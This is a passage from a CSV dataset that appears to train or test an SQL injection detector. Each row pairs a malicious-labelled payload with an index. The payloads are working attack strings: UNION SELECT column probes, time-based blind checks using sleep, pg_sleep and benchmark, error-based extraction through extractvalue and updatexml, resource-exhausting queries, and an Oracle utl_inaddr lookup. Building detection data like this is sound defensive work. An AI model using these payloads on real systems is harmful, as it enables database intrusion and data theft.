row_index,payload_norm,label,sqli_type_hint
8670,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'clhg' = 'clhg",1,
8671,"1%"" union all select null,null,null#",1,
8672,select ( case when ( 1354 = 7529 ) then 1354 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
8673,"1' and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
8674,"1' in boolean mode ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
8675,1 ) where 1527 = 1527 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
8676,"1%"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
8677,"1' ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8678,"1%"" union all select null,null,null,null,null,null,null,null,null#",1,
8679,"-7637"" union all select 8498,8498,8498--",1,
8680,"1"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""oyfk"" = ""oyfk",1,
8681,"1 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
8682,"1%"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""%"" = """,1,
8683,1 where 9752 = 9752,1,
8684,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'zurf' = 'zurf",1,
8685,1'|| ( select 'yezk' where 2097 = 2097,1,
8686,1%' rlike sleep ( 5 ) and '%' = ',1,
8687,"1' where 8860 = 8860 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,
8688,"1%"" ) ) ) union all select null,null,null,null,null,null#",1,
8689,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1,
8690,"-2745' or elt ( 1032 = 1032,3623 )",1,
8691,1' ) ) ) and 8162 = 1687 and ( ( ( 'tdyr' like 'tdyr,1,
8692,( case when 8422 = 8452 then 1 else null end ),1,
8693,"-9256"" ) ) union all select 2977,2977,2977,2977,2977,2977,2977--",1,
8694,"1"" ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8695,"-3758' ) ) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",1,
8696,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'zjnp' = 'zjnp",1,
8697,"select count ( * ) from generate_series ( 1,5000000 ) and ( ""kngx"" like ""kngx",1,
8698,"1' in boolean mode ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
8699,1'|| ( select 'zeet' from dual where 9567 = 9567 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
